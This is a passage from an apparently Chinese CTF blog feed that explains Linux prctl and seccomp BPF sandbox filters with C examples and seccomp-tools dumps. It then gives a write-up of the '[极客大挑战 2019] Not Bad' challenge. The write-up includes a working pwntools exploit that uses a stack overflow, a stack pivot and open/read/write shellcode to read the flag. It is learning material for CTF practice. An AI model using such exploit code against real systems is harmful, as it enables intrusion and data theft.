<span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* process_name = <span class="string">&quot;MyProcess&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) process_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程名称</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_GET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process name: %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在上述示例中，我们使用 prctl 函数将当前进程的名称设置为 &quot;MyProcess&quot;。然后，我们再次使用 prctl 函数获取进程的名称，并将其打印到标准输出。</p><p>​请注意，prctl 函数的具体行为和可用选项可能因操作系统和版本而异。在使用 prctl 函数时，应该查阅相关文档并了解所使用的操作系统的支持和限制。</p><h2 id="3-bpf过滤规则伯克利封装包过滤"><a class="markdownIt-Anchor" href="#3-bpf过滤规则伯克利封装包过滤">#</a> 3、BPF 过滤规则 (伯克利封装包过滤)</h2><p>​突破沙箱规则，本质上就是一种越权漏洞。seccomp 是 linux 保护进程安全的一种保护机制，它通过对系统调用函数的限制，来保护内核态的安全。所谓沙箱，就是把用户态和内核态相互分离开，让用户态的进程，不要影响到内核态，从而保证系统安全。</p><p>​如果我们在沙箱中，完全遵守 seccomp 机制，我们便只能调用 exit (),sigreturn (),read () 和 write () 这四种系统调用，那么其实我们的进程应该是安全的（其实也不一定，后面的例题就没有溢出，而是通过系统调用直接读取文件）。但是，由于他的规则过于死板，所以后面出现了过滤模式，让我们可以调用到那些系统调用。回顾上面提到的 PT_SET_SECCOMP 这个参数，后面接到的第一个参数，就是它设置的模式，第三个参数，指向 sock_fprog 结构体，sock_fprog 结构体中，又有指向 sock_filter 结构体的指针，sock_filter 结构体这里，就是我们要设置规则的地方。</p><p>我们在设置过滤规则，在面对沙箱题目的时候，会经常用到 Seccomp-tools 这个工具。</p><p><strong>BPF 指令集简介</strong></p><blockquote><p>BPF_LD：加载操作，BPF_H 表示按照字节传送，BPF_W 表示按照双字来传送，BPF_B 表示传送单个字节。</p><p>BPF_LDX：从内存中加载 byte/half-word/word/double-word。</p><p>BPF_ST,BPF_STX：存储操作</p><p>BPF_ALU,BPT_ALU64：逻辑操作运算。</p><p>BPT_JMP：跳转操作，可以和 JGE，JGT，JEQ，JSET 一起表示有条件的跳转，和 BPF_JA 一起表示没有条件的跳转。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/prctl.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/bpf.h&gt;</span>             <span class="comment">//off和imm都是有符号类型，编码信息定义在内核头文件linux/bpf.h</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[]=</span>&#123;</span><br><span class="line">                BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>),   <span class="comment">// 从第0个字节开始，传送4个字节</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>), <span class="comment">// 比较是否为59（execve 的系统调用号），是就跳过下一行，如果不是，就执行下一行，第三个参数表示执行正确的指令跳转，第四个参数表示执行错误的指令跳转</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        <span class="comment">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></span><br><span class="line">        <span class="comment">//        杀死一个进程</span></span><br><span class="line">        <span class="comment">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></span><br><span class="line">        <span class="comment">//        父进程追踪子进程，具体没太搞清楚</span></span><br><span class="line">                 BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ERRNO),</span><br><span class="line">        <span class="comment">//        异常处理</span></span><br><span class="line">                BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="comment">//        这里表示系统调用如果正常，允许系统调用</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span>=</span>&#123;</span><br><span class="line">                .len=<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(sock_filter[<span class="number">0</span>]),</span><br><span class="line">                .filter=filter,</span><br><span class="line">        &#125;;</span><br><span class="line">        prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<span class="comment">//第一个参数是进行什么设置，第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​开始的时候，我们设置了 sock_filter 结构体数组。这里为什么是一个结构体数组呢？因为我们看到里面有 BPF_STMT 和 BPF_JMP 的宏定义，其实 BPF_STMT 和 BPF_JMP 都是条件编译后赋值的 sock_filter 结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>​上面的例子中禁用了 execve 的系统调用号，64 位系统中 execve 的系统调用号是 59.</p><p>​BPF_JUMP 后的第二个参数是我们要设置的需要禁用的系统调用号。</p><p>​我们在这里禁用的两个系统调用分别是 sys_restart_syscall 和 execve，如果出现这两个系统调用，那么我们就会跳转到 BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_ERRNO) 的异常处理。其实，如果我们要直接杀死这个进程的话，BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_KILL) 这个规则可以直接杀死进程。</p><p>​GitHub 上的一个真实例子：</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZm50bG56LzA4YWUyMGJlZmI5MWJlZmQ5YTUzY2Q5MWNkYzZkNTA3">例子</span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">install_filter</span><span class="params">(<span class="type">int</span> nr, <span class="type">int</span> arch, <span class="type">int</span> error)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">      .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">      .filter = filter,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hey there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;something&#x27;s gonna happen!!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;it will not definitely print this here\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​用  <code>seccomp-tools</code>  来 dump 下看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/CTest/seccomp$ seccomp-tools dump ./prctl</span><br><span class="line">hey there!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>​禁用掉之后，我们通过 seccomp 来 dump 一下。我们看到，最前面的就是 sock_filter 结构体的四个参数，后面的，就是 bpf 规则的汇编表示。</p><h2 id="4-orw"><a class="markdownIt-Anchor" href="#4-orw">#</a> 4、orw：</h2><h3 id="极客大挑战-2019not-bad"><a class="markdownIt-Anchor" href="#极客大挑战-2019not-bad">#</a> [极客大挑战 2019] Not Bad：</h3><p>​先检查下保护：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>​没有开保护，且存在 RWX 段，IDA 看看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​函数名等等有问题，试着恢复下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp();</span><br><span class="line">  init_0();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​简单恢复了下之后是这样，先看看 seccomp 函数，里面很明显存在沙盒（可能是种不专业的说法）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​好，那么直接用 seccomp-tools 工具 dump 一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>​最后发现可以利用的系统调用有 orw 三个，那么看看 vuln 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里存在栈溢出，感觉可以打 shellcode，但是，明显发现栈的长度不够 ret2shellcode，推测一手栈迁移，试试看。</p><p>​经过动调之后，发现在执行到函数 mmap 之后，存在一个可写可执行权限的内存段（扔一个小知识点：这里 mmap 参数类型是（起始地址，大小，保护类，文件描述符] 等））：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x123000           0x124000 -wxp     1000      0 [anon_00123]</span><br></pre></td></tr></table></figure><p>​可以将栈迁移到这儿去，再执行 shellcode 或者 syscall 读文件，不过，这个要之后再说了。大概思路说下吧，先通过 shellcode 调用 read 函数将读文件写入内存然后输出这样的一个顺序，先贴一下 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    mnap = <span class="number">0x123000</span></span><br><span class="line">    jmp_rsp = <span class="number">0x0400a01</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">    shellcode = asm(shellcraft.read(<span class="number">0</span>,mnap,<span class="number">0x100</span>))</span><br><span class="line">    shellcode += asm(<span class="string">&#x27;mov rax,0x123000;call rax&#x27;</span>)</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)<span class="comment">#这里的减0x30我没怎么看懂，记录在这儿</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    payload2 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="number">3</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,mnap+<span class="number">0x100</span>,<span class="number">0x100</span>))</span><br><span class="line">    io.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章：</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=">从 prctl 函数开始学习沙箱规则</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21yaGVzb25nemUvYXJ0aWNsZS9kZXRhaWxzLzEwMzAwODkyNQ==">BPF 详解</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x2eHU2NjYvYXJ0aWNsZS9kZXRhaWxzLzEzMDgyMTMzMA==">函数 prctl 系统调用</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初识pwn沙箱&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#初识pwn沙箱&quot;&gt;#&lt;/a&gt; 初识 Pwn 沙箱&lt;/h1&gt;
&lt;p&gt;​		沙箱机制，英文 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软</summary>
      
    
    
    
    <category term="Pwn手的自我修养" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>python原型链污染</title>
    <link href="http://blog.g01den.top/posts/ff5b88d5.html"/>
    <id>http://blog.g01den.top/posts/ff5b88d5.html</id>
    <published>2024-07-20T20:48:16.000Z</published>
    <updated>2024-09-15T08:47:06.690Z</updated>
    
